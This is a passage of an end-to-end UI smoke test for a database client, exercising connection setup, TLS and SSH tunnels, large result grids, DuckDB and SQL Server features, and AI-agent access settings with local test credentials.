    await viewer.getByRole("textbox", { name: "New value for ref_id" }).press("Control+s");
    await panel.getByRole("status").filter({ hasText: "Applied 1 change" }).waitFor();
    await page.waitForFunction((el) => !el.isConnected, beforeSave);
    await panel.getByRole("toolbar", { name: "Row actions" }).waitFor();
    {
      const box = await panel.locator(".grid-scroller").boundingBox();
      await page.mouse.click(box.x + 52 + 20, box.y + 34 + 12);
      await page.keyboard.press("Enter");
    }
    await panel.locator(".cell-viewer").getByRole("button", { name: "Row", exact: true }).click();
    await panel.locator(".cell-viewer .row-field").nth(4).waitFor();
    assert.deepEqual(
      await panel.locator(".cell-viewer .row-field dd").allInnerTexts(),
      ["1", "2026-11-10 09:05:07.500", "happy", "paid", "77"],
    );
    await panel.locator(".cell-viewer").getByRole("button", { name: "Cell", exact: true }).click();
  }
  await page.keyboard.press("Control+w");
  if (process.env.SPELAION_E2E_EDIT_ONLY === "1") throw editSmokeComplete;

  step("PostgreSQL behind two bastions with TLS verify-full");
  panel = await newQuery(
    "Postgres behind bastions",
    "select inet_server_addr()::text as server, ssl, version, cipher\nfrom pg_stat_ssl\nwhere pid = pg_backend_pid();",
  );
  await run(panel);
  // First the password (the keychain does not have it yet, so it offers to remember it); then,
  // when the tunnel opens, the fingerprint of each bastion.
  await page.getByRole("dialog").getByText("Password for Postgres behind bastions").waitFor();
  // Offered, and left unticked: the smoke test never writes the user's real keychain.
  await page.getByRole("checkbox", { name: "Remember in the system keychain" }).uncheck();
  await page.getByLabel("Password", { exact: true }).fill("spelaion");
  await page.getByRole("button", { name: "Connect", exact: true }).click();
  for (let hop = 1; hop <= 2; hop++) {
    await page.getByRole("dialog").getByText(`(hop ${hop})`).waitFor();
    if (hop === 1) await shot("08-ssh-fingerprint");
    await page.getByRole("button", { name: "Trust and remember" }).click();
  }
  await panel.locator(".statusline", { hasText: "1 row" }).waitFor();
  await panel.locator(".toolbar .type-badge.badge-prod", { hasText: "PRODUCTION" }).waitFor();
  await shot("09-bastions");
  // Production has smart commit (ADR-031): reads stay in auto-commit, the first change opens a
  // transaction that waits for Commit or Rollback, then the tab is back in auto-commit.
  const prodAutoCommit = panel.locator(".transaction-controls").getByRole("checkbox", { name: /Auto-commit/ });
  await panel.locator(".transaction-controls .smart", { hasText: "smart" }).waitFor();
  assert.ok(await prodAutoCommit.isChecked());
  await replaceQuery(panel, "create temp table smart_tx (id int);");
  await run(panel);
  const prodRisk = page.getByRole("dialog", { name: "Run these statements?" });
  await prodRisk.getByRole("button", { name: "Run anyway" }).click();
  await prodRisk.waitFor({ state: "detached" });
  await panel.locator(".tx-badge", { hasText: "TX open · 1" }).waitFor();
  assert.ok(!(await prodAutoCommit.isChecked()));
  await shot("09a-smart-commit");
  await panel.getByRole("button", { name: "Rollback", exact: true }).click();
  await panel.locator(".tx-badge").waitFor({ state: "detached" });
  await page.waitForFunction(() => document.querySelector(".tab-panel:not([hidden]) .transaction-controls input[type=checkbox]")?.checked === true);

  step("add connection: catalog by category, test and save (personal, nothing in the repo)");
  await page.getByRole("button", { name: "Add connection", exact: true }).first().click();
  let wizard = page.getByRole("dialog", { name: "Add connection" });
  await wizard.getByRole("heading", { name: "Relational" }).waitFor();
  await wizard.getByRole("heading", { name: "NoSQL" }).waitFor();
  assert.ok(!(await wizard.locator(".engine-card", { hasText: "MySQL" }).isDisabled()));
  assert.ok(!(await wizard.locator(".engine-card", { hasText: "MariaDB" }).isDisabled()));
  assert.ok(!(await wizard.locator(".engine-card", { hasText: "SQL Server" }).isDisabled()));
  assert.ok(!(await wizard.locator(".engine-card", { hasText: "DuckDB" }).isDisabled()));
  assert.ok(await wizard.locator(".engine-card", { hasText: "Oracle" }).isDisabled());
  await wizard.locator(".engine-card", { hasText: "Oracle" }).getByText("Coming soon").waitFor();
  await shot("12a-add-connection-catalog");
  // A connection URL fills the form (password included, only in the form), then back.
  await wizard.getByRole("textbox", { name: "Or paste a connection URL" }).fill("jdbc:mysql://reports.example.com:3307/sales?user=reader&password=s%26cret&sslMode=VERIFY_IDENTITY");
  await wizard.getByRole("button", { name: "Use URL" }).click();
  let urlForm = page.locator(".modal.wizard");
  await urlForm.getByRole("heading", { name: "New MySQL connection" }).waitFor();
  assert.equal(await urlForm.getByLabel("Host", { exact: true }).inputValue(), "reports.example.com");
  assert.equal(await urlForm.getByLabel("Port", { exact: true }).inputValue(), "3307");
  assert.equal(await urlForm.getByLabel("Database", { exact: true }).inputValue(), "sales");
  assert.equal(await urlForm.getByLabel("User", { exact: true }).inputValue(), "reader");
  assert.equal(await urlForm.getByLabel("Password", { exact: true }).inputValue(), "s&cret");
  assert.equal(await urlForm.getByLabel("Name", { exact: true }).inputValue(), "sales");
  await shot("12a1-connection-url");
  await urlForm.getByRole("button", { name: "Back", exact: true }).click();
  wizard = page.getByRole("dialog", { name: "Add connection" });
  await wizard.getByRole("textbox", { name: "Or paste a connection URL" }).fill("redis://cache:6379");
  await wizard.getByRole("button", { name: "Use URL" }).click();
  await wizard.getByRole("alert").filter({ hasText: "not a connection URL" }).waitFor();
  await wizard.getByRole("searchbox").fill("lite");
  assert.equal(await wizard.locator(".engine-card").count(), 1);
  await wizard.locator(".engine-card", { hasText: "SQLite" }).click();
  wizard = page.locator(".modal.wizard");
  await wizard.getByRole("heading", { name: "New SQLite connection" }).waitFor();
  // SQLite has no SSL tab; SSH is for a file on a server (ADR-018).
  assert.deepEqual(await wizard.getByRole("tab").allTextContents(), ["Main", "SSH", "Session", "Options"]);
  await wizard.getByLabel("Name", { exact: true }).fill("Shop copy");
  await wizard.getByLabel("File", { exact: true }).fill(join(demo, "data", "shop.db"));
  await wizard.getByRole("tab", { name: "Options" }).click();
  await wizard.getByRole("radio", { name: "Personal", exact: true }).check();
  // A description over two lines: the tooltip of the connection, written to its file.
  const shopCopyDescription = "Copy of the demo shop.\nFor trying things out.";
  await wizard.getByLabel("Description", { exact: true }).fill(`  ${shopCopyDescription}\n`);
  // Tags as chips: a comma or Enter adds one, a repeat in another case is not added twice.
  // A box with suggestions (`list`) is a combobox.
  const tagBox = wizard.getByRole("combobox", { name: "Tags", exact: true });
  await tagBox.pressSequentially("demo,");
  await tagBox.fill("Testing");
  await tagBox.press("Enter");
  await tagBox.fill("DEMO");
  await tagBox.press("Enter");
  assert.deepEqual(await wizard.locator(".tag-chip").allTextContents(), ["demo×", "Testing×"]);
  // Enter in the tag box added a tag: it did not submit the form.
  await wizard.getByRole("heading", { name: "New SQLite connection" }).waitFor();
  await wizard.getByRole("button", { name: "Test connection" }).click();
  await wizard.locator(".test-result", { hasText: /Connected · 3\./ }).waitFor();
  await wizard.getByRole("button", { name: "Save", exact: true }).click();
  await wizard.waitFor({ state: "detached" });
  await page.locator(".connection-row", { hasText: "Shop copy" }).waitFor();
  assert.equal(
    await page.locator(".connection-row", { hasText: "Shop copy" }).locator(".label").getAttribute("title"),
    `${shopCopyDescription}\n\n~/shop-copy\nTags: demo, Testing`,
  );
  const shopCopyFile = readFileSync(join(userDir, "connections", "shop-copy.toml"), "utf8");
  assert.match(shopCopyFile, /Copy of the demo shop\.\nFor trying things out\./);
  assert.match(shopCopyFile, /tags = \[\s*"demo",\s*"Testing",?\s*\]/);
  // Tags next to the name; a click filters the explorer to the connections that have it.
  const shopCopyRow = page.locator(".connection-row", { hasText: "Shop copy" });
  assert.deepEqual(await shopCopyRow.locator(".connection-tag").allTextContents(), ["#demo", "#Testing"]);
  const allConnections = await page.locator(".connection-row").count();
  assert.ok(allConnections > 1);
  await shopCopyRow.locator(".connection-tag", { hasText: "#demo" }).click();
  const tagFilter = page.getByRole("group", { name: "Filter connections by tag" });
  await tagFilter.getByRole("button", { name: "#demo" }).waitFor();
  assert.equal(await tagFilter.getByRole("button", { name: "#demo" }).getAttribute("aria-pressed"), "true");
  assert.equal(await tagFilter.getByRole("button", { name: "#Testing" }).getAttribute("aria-pressed"), "false");
  for (let i = 0; i < 40 && (await page.locator(".connection-row").count()) !== 1; i++) await page.waitForTimeout(50);
  assert.deepEqual(await page.locator(".connection-row .label").allTextContents(), ["Shop copy"]);
  await shot("12a0-filter-by-tag");
  // Off again from the filter's chip; closing the quick filter forgets the tags.
  await tagFilter.getByRole("button", { name: "#demo" }).click();
  for (let i = 0; i < 40 && (await page.locator(".connection-row").count()) !== allConnections; i++) await page.waitForTimeout(50);
  assert.equal(await page.locator(".connection-row").count(), allConnections);
  await tagFilter.getByRole("button", { name: "#Testing" }).click();
  assert.deepEqual(await page.locator(".connection-row .label").allTextContents(), ["Shop copy"]);
  await page.getByRole("button", { name: "Filter the explorer", exact: true }).click();
  await tagFilter.waitFor({ state: "detached" });
  assert.equal(await page.locator(".connection-row").count(), allConnections);
  panel = await newQuery("Shop copy", "select count(*) as n from product;");
  assert.equal(
    await panel.locator("select").first().locator("option", { hasText: "Shop copy" }).getAttribute("title"),
    `${shopCopyDescription}\n\n~/shop-copy`,
  );
  assert.equal(await panel.locator("select").first().getAttribute("title"), `${shopCopyDescription}\n\n~/shop-copy`);
  await run(panel);
  await panel.locator(".statusline", { hasText: "1 row" }).waitFor();

  // A new SQLite database: the core creates the file and never overwrites it.
  await page.getByRole("button", { name: "Add connection", exact: true }).first().click();
  wizard = page.locator(".modal.wizard");
  await wizard.locator(".engine-card", { hasText: "SQLite" }).click();
  const newDb = join(userDir, "scratch.sqlite");
  await page.evaluate((target) => (window.__spelaionSavePath = target), newDb);
  await wizard.getByRole("button", { name: "New database…" }).click();
  const fileInput = wizard.getByLabel("File", { exact: true });
  for (let i = 0; i < 40 && (await fileInput.inputValue()) !== newDb; i++) await page.waitForTimeout(100);
  assert.equal(await fileInput.inputValue(), newDb);
  assert.equal(await wizard.getByLabel("Name", { exact: true }).inputValue(), "scratch");
  assert.ok(readFileSync(newDb).subarray(0, 16).equals(Buffer.from("SQLite format 3\0")));
  await wizard.getByRole("button", { name: "Test connection" }).click();
  await wizard.locator(".test-result", { hasText: /Connected · 3\./ }).waitFor();
  await wizard.getByRole("button", { name: "New database…" }).click();
  await wizard.getByRole("alert").filter({ hasText: "already exists: a new database never replaces a file" }).waitFor();
  await shot("12a2-new-sqlite-database");
  // Tags already used by other connections are suggested.
  await wizard.getByRole("tab", { name: "Options" }).click();
  const suggested = await wizard.locator(".tag-input datalist option").evaluateAll((options) => options.map((o) => o.value));
  assert.deepEqual(suggested, ["demo", "Testing"]);
  await page.evaluate(() => delete window.__spelaionSavePath);
  await wizard.getByRole("button", { name: "Cancel", exact: true }).click();
  await wizard.waitFor({ state: "detached" });

  step("DuckDB: a new database file, nested types as DuckDB writes them, two tabs on one file");
  await page.getByRole("button", { name: "Add connection", exact: true }).first().click();
  wizard = page.locator(".modal.wizard");
  await wizard.locator(".engine-card", { hasText: "DuckDB" }).click();
  const duckDb = join(userDir, "analytics.duckdb");
  await page.evaluate((target) => (window.__spelaionSavePath = target), duckDb);
  await wizard.getByRole("button", { name: "New database…" }).click();
  const duckFile = wizard.getByLabel("File", { exact: true });
  for (let i = 0; i < 40 && (await duckFile.inputValue()) !== duckDb; i++) await page.waitForTimeout(100);
  assert.equal(await duckFile.inputValue(), duckDb);
  assert.equal(await wizard.getByLabel("Name", { exact: true }).inputValue(), "analytics");
  await page.evaluate(() => delete window.__spelaionSavePath);
  await wizard.getByRole("tab", { name: "Options" }).click();
  await wizard.getByRole("radio", { name: "Personal", exact: true }).check();
  await wizard.getByRole("button", { name: "Test connection" }).click();
  await wizard.locator(".test-result", { hasText: /Connected · v\d+\./ }).waitFor();
  await wizard.getByRole("button", { name: "Save", exact: true }).click();
  await wizard.waitFor({ state: "detached" });
  await page.locator(".connection-row", { hasText: "analytics" }).waitFor();
  assert.match(readFileSync(join(userDir, "connections", "analytics.toml"), "utf8"), /engine = "duckdb"/);
  panel = await newQuery(
    "analytics",
    "create table sales as select range as id, [range, range * 2] as pair, {'city': 'Madrid'} as place from range(3);\nselect * from sales order by id;",
  );
  await run(panel);
  await panel.locator(".statusline", { hasText: "3 rows" }).waitFor();
  await shot("12a3-duckdb");
  step("grid look: booleans as checkboxes and NULL drawn empty, from Settings");
  {
    const looks = await newQuery("analytics", "select true as yes, false as no, cast(null as varchar) as nothing;");
    await run(looks);
    await looks.locator(".statusline", { hasText: "1 row" }).waitFor();
    const [yesW, noW] = (await looks.locator(".grid-scroller").getAttribute("data-column-widths")).split(",").map(Number);
    const ROW_NUM = 52;
    const middle = 34 + 12;
    const yesCentre = ROW_NUM + yesW / 2;
    const nothingX = ROW_NUM + yesW + noW;
    const nullInk = () => inked(looks, nothingX + 4, middle - 6, nothingX + 40, middle + 6);
    // Text by default: "true" starts on the left, the middle of the cell is empty.
    const bg = await pixel(looks, yesCentre + 30, middle);
    assert.equal(await pixel(looks, yesCentre - 3, middle + 3), bg);
    assert.ok((await nullInk()) > 0, "NULL is written");
    await setGridLook({ boolCheckboxes: true, nullText: false });
    assert.notEqual(await pixel(looks, yesCentre - 3, middle + 3), bg, "a ticked checkbox in the middle of true");
    assert.equal(await nullInk(), 0, "NULL drawn empty");
    await shot("12a4-grid-checkboxes");
    await setGridLook({ boolCheckboxes: false, nullText: true });
    await page.keyboard.press("Control+w");
  }

  step("a million rows: select, find, sort, filter by value and copy a column, the UI painting all along");
  {
    const big = await newQuery(
      "analytics",
      "select range as id, 'item ' || range as name, range * 1.5 as price, range % 7 = 0 as lucky from range(1000000) limit 1000000;",
    );
    const timings = {};
    let measured = await longestFrameGap(async () => {
      await run(big);
      await big.locator(".statusline", { hasText: "1,000,000 rows" }).waitFor({ timeout: 120_000 });
    });
    timings.load = measured;
    const grid = big.locator(".grid-scroller");
    const box = await grid.boundingBox();
    const rowNum = 9 * 8 + 12; // "1,000,000" in the row-number gutter
    const widths = async () => (await grid.getAttribute("data-column-widths")).split(",").map(Number);
    const status = big.locator(".grid-selection");
    // Scrolling to the middle and the end.
    timings.scroll = await longestFrameGap(async () => {
      for (const at of [0.5, 1]) {
        await grid.evaluate((el, f) => (el.scrollTop = (el.scrollHeight - el.clientHeight) * f), at);
        await page.waitForTimeout(300);
      }
      await grid.evaluate((el) => (el.scrollTop = 0));
      await page.waitForTimeout(200);
    });
    await page.mouse.click(box.x + rowNum + 20, box.y + 34 + 12);
    timings.selectAll = await longestFrameGap(async () => {
      await page.keyboard.press("Control+a");
      await status.getByText("All 1,000,000 rows selected", { exact: true }).waitFor();
      await page.keyboard.press("Control+End");
      await status.getByText("1 cell selected", { exact: true }).waitFor();
      await page.keyboard.press("Control+Shift+Home");
      await status.getByText("All 1,000,000 rows selected", { exact: true }).waitFor();
    });
    await page.mouse.click(box.x + rowNum + 20, box.y + 34 + 12);
    // Find: the core reads every cell of the million rows.
    await page.keyboard.press("Control+f");
    const bar = big.getByRole("search", { name: "Find in results" });
    timings.find = await longestFrameGap(async () => {
      await bar.getByRole("searchbox").fill("item 99999");
      // Only names hold "item": 99999 and 999990–999999.
      await bar.getByRole("status").getByText("1 of 11", { exact: true }).waitFor({ timeout: 60_000 });
    });
    await bar.getByRole("searchbox").focus();
    await page.keyboard.press("Escape");
    await grid.evaluate((el) => (el.scrollTop = 0));
    // Sort in the core by a header click, then back.
    const [idW, nameW] = await widths();
    timings.sort = await longestFrameGap(async () => {
      await page.mouse.click(box.x + rowNum + idW + nameW + 20, box.y + 18);
      await big.locator('.grid-scroller[aria-label="Result with 1,000,000 rows, sorted by price, ascending"]').waitFor({ timeout: 60_000 });
      await page.mouse.click(box.x + rowNum + idW + nameW + 20, box.y + 18);
      await big.locator('.grid-scroller[aria-label="Result with 1,000,000 rows, sorted by price, descending"]').waitFor({ timeout: 60_000 });
      await page.mouse.click(box.x + rowNum + idW + nameW + 20, box.y + 18);
      await big.locator('.grid-scroller[aria-label="Result with 1,000,000 rows"]').waitFor({ timeout: 60_000 });
    });
    // Filter by this value: name contains "item 12345" (12345 and 123450–123459).
    timings.filter = await longestFrameGap(async () => {
      await grid.evaluate((el) => (el.scrollTop = 24 * 12_345));
      await page.waitForTimeout(300);
      // The row at the top is 12345 (rows are 24 px high).
      await page.mouse.click(box.x + rowNum + idW + 20, box.y + 34 + 12, { button: "right" });
      await big.locator(".result-grid-menu").getByRole("menuitem", { name: "Filter ▸" }).hover();
      await big.getByRole("menuitem", { name: "name contains 'item 12345'" }).click();
      await big.locator(".statusline", { hasText: "11 of 1,000,000 rows" }).waitFor({ timeout: 60_000 });
    });
    await big.getByRole("button", { name: "Reset filters" }).click();
    await big.locator(".statusline", { hasText: /^1,000,000 rows/ }).waitFor({ timeout: 60_000 });
    // Every value of a column as an IN list: two for "lucky", too many for "id".
    const luckyX = box.x + rowNum + (await widths()).slice(0, 3).reduce((a, b) => a + b, 0) + 20;
    timings.inList = await longestFrameGap(async () => {
      const before = await page.evaluate(() => window.__copied.length);
      await page.mouse.click(luckyX, box.y + 18, { button: "right" });
      await big.locator(".result-grid-menu").getByRole("menuitem", { name: "Copy all values as SQL IN list" }).click();
      assert.equal(await copied(before + 1), "(TRUE, FALSE)");
    });
    await page.mouse.click(box.x + rowNum + 20, box.y + 18, { button: "right" });
    await big.locator(".result-grid-menu").getByRole("menuitem", { name: "Copy all values as SQL IN list" }).click();
    await big.locator(".grid-notice.error", { hasText: "more than 10000 different values" }).waitFor();
    await shot("12a5-grid-million");
    const report = Object.entries(timings).map(([name, t]) => `${name} ${t.elapsed} ms (longest frame gap ${t.gap} ms)`).join(", ");
    console.log(`  1M rows: ${report}`);
    writeFileSync(join(shots, "million-rows.json"), JSON.stringify(timings, null, 2));
    for (const [name, t] of Object.entries(timings)) {
      // The query itself streams a million rows in: only the rest must keep painting.
      if (name !== "load") assert.ok(t.gap < 1000, `${name}: the UI froze for ${t.gap} ms`);
    }
    await page.keyboard.press("Control+w");
  }

  step("five million rows, past the browser's height cap: Ctrl+End, the scroll bar and the wheel reach every row (SDB-109)");
  {
    const huge = await newQuery("analytics", "select range as id from range(5000000) limit 5000000;");
    await run(huge);
    await huge.locator(".statusline", { hasText: "5,000,000 rows" }).waitFor({ timeout: 180_000 });
    const grid = huge.locator(".grid-scroller");
    const box = await grid.boundingBox();
    const viewH = await grid.evaluate((el) => el.clientHeight);
    const rowNum = 9 * 8 + 12; // "5,000,000" in the row-number gutter
    // 5,000,000 rows of 24 px are 120,000,034 px: the spacer stays under Chromium's cap.
    const spacer = await grid.evaluate((el) => el.scrollHeight);
    assert.ok(spacer < 33_554_428, `the spacer is ${spacer} px`);
    // The row the grid announces for its selected cell, once its value is read.
    const cell = grid.getByRole("gridcell");
    const selectedRow = async () => {
      await page.waitForFunction((el) => /^Row [\d,]+, id \(.+\): \d+$/.test(el?.textContent ?? ""), await cell.elementHandle());
      const [, row, value] = (await cell.textContent()).match(/^Row ([\d,]+), id \(.+\): (\d+)$/);
      const number = Number(row.replace(/,/g, ""));
      assert.equal(Number(value), number - 1, "the row shows its own value");
      return number;
    };
    // A click on the first and the last row the grid shows.
    const clickTop = async () => { await page.mouse.click(box.x + rowNum + 20, box.y + 34 + 12); return selectedRow(); };
    const clickBottom = async () => { await page.mouse.click(box.x + rowNum + 20, box.y + viewH - 12); return selectedRow(); };
    assert.equal(await clickTop(), 1);
    // Ctrl+End selects the last row and scrolls it into view, where a click finds it.
    await page.keyboard.press("Control+End");
    await cell.getByText(/^Row 5,000,000, id \(.+\): 4999999$/).waitFor();
    assert.equal(await clickBottom(), 5_000_000);
    await setTheme("dark", "dark");
    await shot("12a6-grid-past-height-cap-dark");
    await setTheme("light", "light");
    await shot("12a6-grid-past-height-cap-light");
    // The wheel moves the rows by its own pixels, not by pixels of the shorter spacer (each
    // one about four rows' worth here): 240 px up is ten rows, whatever delta the page got.
    await grid.evaluate((el) => {
      window.__gridWheel = { y: 0, modes: [] };
      el.addEventListener("wheel", (e) => { window.__gridWheel.y += e.deltaY; window.__gridWheel.modes.push(e.deltaMode); });
    });
    await page.mouse.move(box.x + rowNum + 20, box.y + 200);
    await page.mouse.wheel(0, -240);
    await page.waitForTimeout(300);
    const wheel = await page.evaluate(() => window.__gridWheel);
    assert.ok(wheel.y < 0 && wheel.modes.every((mode) => mode === 0), `wheel ${JSON.stringify(wheel)}`);
    // The last row ended at the bottom; the row now at the bottom is that many pixels higher.
    assert.equal(await clickBottom(), Math.floor((5_000_000 * 24 - 12 + wheel.y) / 24) + 1);
    // The scroll bar: its middle shows the middle rows, its end the last row.
    await grid.evaluate((el) => (el.scrollTop = (el.scrollHeight - el.clientHeight) / 2));
    await page.waitForTimeout(300);
    const middle = await clickTop();
    assert.ok(Math.abs(middle - 2_500_000) < 1_000, `the middle of the scroll shows row ${middle}`);
    await grid.evaluate((el) => (el.scrollTop = el.scrollHeight));
    await page.waitForTimeout(300);
    assert.equal(await clickBottom(), 5_000_000);
    // Ctrl+Home goes back to the first row.
    await page.keyboard.press("Control+Home");
    await cell.getByText(/^Row 1, id \(.+\): 0$/).waitFor();
    assert.equal(await clickTop(), 1);
    await page.keyboard.press("Control+w");
  }
  // A second tab on the same file (DuckDB opens a file once per process: they share it).
  const second = await newQuery("analytics", "select count(*) as n from sales;");
  await run(second);
  await second.locator(".statusline", { hasText: "1 row" }).waitFor();

  step("SQL Server: a new connection, a batch with two result sets");
  await page.getByRole("button", { name: "Add connection", exact: true }).first().click();
  wizard = page.locator(".modal.wizard");
  await wizard.locator(".engine-card", { hasText: "SQL Server" }).click();
  await wizard.getByLabel("Name", { exact: true }).fill("SQL Server (Docker)");
  await wizard.getByLabel("Host", { exact: true }).fill("127.0.0.1");
  await wizard.getByLabel("Port", { exact: true }).fill("11433");
  await wizard.getByLabel("User", { exact: true }).fill("sa");
  // Asked every time: never stored, not even in the keychain.
  await wizard.getByRole("checkbox", { name: "Save password" }).uncheck();
  await wizard.getByLabel("Password", { exact: true }).fill("Spelaion-test-1");
  await wizard.getByRole("tab", { name: "Options" }).click();
  await wizard.getByRole("radio", { name: "Personal", exact: true }).check();
  await wizard.getByRole("button", { name: "Test connection" }).click();
  await wizard.locator(".test-result", { hasText: /Connected · 16\./ }).waitFor();
  await wizard.getByRole("button", { name: "Save", exact: true }).click();
  await wizard.waitFor({ state: "detached" });
  assert.match(readFileSync(join(userDir, "connections", "sql-server-docker.toml"), "utf8"), /engine = "sqlserver"/);
  panel = await newQuery("SQL Server (Docker)", "select name from sys.databases where name = 'master'\nselect 1 as a, N'ñandú' as b");
  await run(panel);
  await page.getByRole("dialog").getByText("Password for SQL Server (Docker)").waitFor();
  await page.getByLabel("Password", { exact: true }).fill("Spelaion-test-1");
  await page.getByRole("button", { name: "Connect", exact: true }).click();
  // One batch, two result sets: two result tabs.
  await panel.locator(".result-tabs button", { hasText: /^Result 2/ }).waitFor();
  // The tab's database, from sys.databases; switching runs the next statements there.
  const sqlServerDatabase = panel.getByLabel("Database", { exact: true });
  await sqlServerDatabase.locator('option[value="tempdb"]').waitFor({ state: "attached" });
  await page.waitForFunction((el) => !el.disabled && el.value === "master", await sqlServerDatabase.elementHandle());
  await sqlServerDatabase.selectOption("tempdb");
  await page.waitForFunction((el) => !el.disabled && el.value === "tempdb", await sqlServerDatabase.elementHandle());
  // A grid read in one database is read-only once the tab picks another, and nothing is
  // written there: tempdb and spelaion hold the same table and key.
  await replaceQuery(panel, [
    "if db_id('spelaion') is null create database spelaion",
    "go",
    "if object_id('spelaion.dbo.sdb137') is null create table spelaion.dbo.sdb137 (id int primary key, name varchar(20))",
    "go",
    "delete from spelaion.dbo.sdb137 where id = 1",
    "go",
    "insert into spelaion.dbo.sdb137 values (1, 'spelaion')",
    "go",
    "if object_id('tempdb.dbo.sdb137') is null create table tempdb.dbo.sdb137 (id int primary key, name varchar(20))",
    "go",
    "delete from tempdb.dbo.sdb137 where id = 1",
    "go",
    "insert into tempdb.dbo.sdb137 values (1, 'tempdb')",
  ].join("\n"));
  await run(panel);
  await panel.getByText("Statement 7:", { exact: false }).waitFor();
  await page.locator(".tabbar .tab.active .tab-running").waitFor({ state: "detached" });
  await replaceQuery(panel, "select id, name from sdb137");
  await run(panel);
  await panel.getByRole("button", { name: "Add row" }).waitFor();
  await sqlServerDatabase.selectOption("spelaion");
  await page.waitForFunction((el) => !el.disabled && el.value === "spelaion", await sqlServerDatabase.elementHandle());
  await panel.getByRole("button", { name: "Add row" }).waitFor({ state: "detached" });
  await panel.locator("span.muted", { hasText: /^Read-only$/ }).first().waitFor();
  {
    const box = await panel.locator(".grid-scroller").boundingBox();
    await page.mouse.dblclick(box.x + 52 + 110 + 20, box.y + 34 + 12);
    await page.waitForTimeout(300);
    assert.equal(await panel.locator("input.cell-editor").count(), 0, "a cell read in tempdb cannot be edited in spelaion");
  }
  await shot("12a4-database-changed-read-only-light");
  await page.evaluate(() => { document.documentElement.dataset.theme = "dark"; });
  await shot("12a4-database-changed-read-only-dark");
  await page.evaluate(() => { document.documentElement.dataset.theme = "light"; });
  // Nothing was written in either database: two rows only if both still hold their names.
  await replaceQuery(panel, "select n from (values (1), (2)) v(n) where (select name from spelaion.dbo.sdb137 where id = 1) = 'spelaion' and (select name from tempdb.dbo.sdb137 where id = 1) = 'tempdb'");
  await run(panel);
  await panel.locator(".statusline", { hasText: "2 rows" }).waitFor();
  await sqlServerDatabase.selectOption("tempdb");
  await page.waitForFunction((el) => !el.disabled && el.value === "tempdb", await sqlServerDatabase.elementHandle());
  // PRINT and low-severity RAISERROR reach the Messages tab (ADR-035).
  await replaceQuery(panel, "print 'hello from the smoke test'\nraiserror('a low severity message', 10, 1)");
  await run(panel);
  await panel.getByText("INFO: hello from the smoke test").waitFor();
  await panel.getByText("INFO: a low severity message").waitFor();
  await shot("12a4-sqlserver");
  step("process monitor: SQL Server sessions and supported actions");
  await activities.getByRole("button", { name: "Processes", exact: true }).click();
  await page.locator("#processes-sidebar").getByRole("button", { name: "SQL Server (Docker)", exact: true }).click();
  const sqlServerMonitor = page.getByRole("region", { name: "Processes", exact: true });
  await sqlServerMonitor.locator(".process-table tbody tr:has(.process-own)").waitFor();
  await sqlServerMonitor.locator(".process-table tbody tr:not(:has(.process-own))").first().click();
  assert.ok(await sqlServerMonitor.getByRole("button", { name: "Cancel query" }).isDisabled());
  assert.equal(await sqlServerMonitor.getByRole("button", { name: "Cancel query" }).getAttribute("title"), "SQL Server can only end another session, not cancel its query separately.");
  assert.ok(await sqlServerMonitor.getByRole("button", { name: "End connection" }).isEnabled());
  await activities.getByRole("button", { name: "Connections", exact: true }).click();
  // The query ends in a word, which may open the completion list as it is typed: the next
  // dialog must not find it on top (the editor closes it when it loses focus).

  await page.getByRole("button", { name: "Add connection", exact: true }).first().click();
  wizard = page.locator(".modal.wizard");
  await wizard.locator(".engine-card", { hasText: "PostgreSQL" }).click();
  assert.deepEqual(await wizard.getByRole("tab").allTextContents(), ["Main", "SSL", "SSH", "Kubernetes", "Session", "Options"]);
  await wizard.getByLabel("Name", { exact: true }).fill("Docker PG (wizard)");
  await wizard.getByLabel("Host", { exact: true }).fill("127.0.0.1");
  await wizard.getByLabel("Port", { exact: true }).fill("15432");
  await wizard.getByLabel("Database", { exact: true }).fill("spelaion");
  await wizard.getByLabel("User", { exact: true }).fill("spelaion");
  // Passwordless logins (ADR-022): a cloud provider's token here, a client certificate in SSL.
  const authMethod = wizard.getByLabel("Method", { exact: true });
  await authMethod.selectOption("token");
  await wizard.getByLabel("Provider", { exact: true }).selectOption("googleCloudSql");
  await wizard.getByText("gcloud sql generate-login-token", { exact: false }).waitFor();
  assert.equal(await wizard.getByLabel("Password", { exact: true }).count(), 0);
  await authMethod.selectOption("password");
  // Not saving the password means "ask every time": the typed one is only used for the test
  // and never stored (not even in the keychain).
  await wizard.getByRole("checkbox", { name: "Save password" }).uncheck();
  await wizard.getByRole("button", { name: "Test connection" }).click();
  // The test log (ADR-032): the address is reached, the login needs the password.
  await wizard.locator(".test-result", { hasText: "Failed at step 3: Password required" }).waitFor();
  await wizard.locator(".test-log .step.ok", { hasText: "Reach 127.0.0.1:15432" }).waitFor();
  await wizard.locator(".test-log .step.failed", { hasText: "type it in the form" }).waitFor();
  await wizard.getByLabel("Password", { exact: true }).fill("wrong");
  await wizard.getByRole("button", { name: "Test connection" }).click();
  await wizard.locator(".test-result", { hasText: "Database authentication" }).waitFor();
  await wizard.locator(".test-log .step.failed", { hasText: "password authentication failed" }).waitFor();
  await wizard.getByLabel("Password", { exact: true }).fill("spelaion");
  await shot("12b-add-connection-main");
  await wizard.getByRole("tab", { name: "SSL" }).click();
  await wizard.getByLabel("TLS", { exact: true }).selectOption("require");
  await wizard.getByLabel("Client certificate (PEM)", { exact: true }).waitFor();
  await wizard.getByLabel("Client key (PEM)", { exact: true }).waitFor();
  await wizard.getByRole("tab", { name: "SSH" }).click();
  // The demo defines one tunnel; leaving the box unchecked connects directly.
  assert.equal(await wizard.getByRole("checkbox", { name: "Connect through a network profile (SSH tunnel or proxy)" }).isChecked(), false);
  await wizard.getByRole("tab", { name: "Options" }).click();
  await wizard.getByLabel("Folder", { exact: true }).fill("Wizard");
  await wizard.getByRole("radio", { name: "Personal", exact: true }).check();
  // Agents only read unless the user lets them write, and only on an exposed connection.
  const agentsCan = wizard.getByLabel("Agents can", { exact: true });
  assert.equal(await agentsCan.isDisabled(), true);
  await wizard.getByRole("checkbox", { name: "Expose to AI agents" }).check();
  await agentsCan.selectOption("write");
  // The warning follows what the core says the type does, not the label's text.
  await wizard.getByLabel("Connection type", { exact: true }).selectOption("prod");
  await wizard.getByRole("alert").filter({ hasText: "agents will be able to change its data" }).waitFor();
  await wizard.getByLabel("Connection type", { exact: true }).selectOption("");
  await wizard.getByRole("button", { name: "Test connection" }).click();
  await wizard.locator(".test-result", { hasText: /Connected · 17\./ }).waitFor();
  await shot("12c-add-connection-options");
  await wizard.getByRole("button", { name: "Save", exact: true }).click();
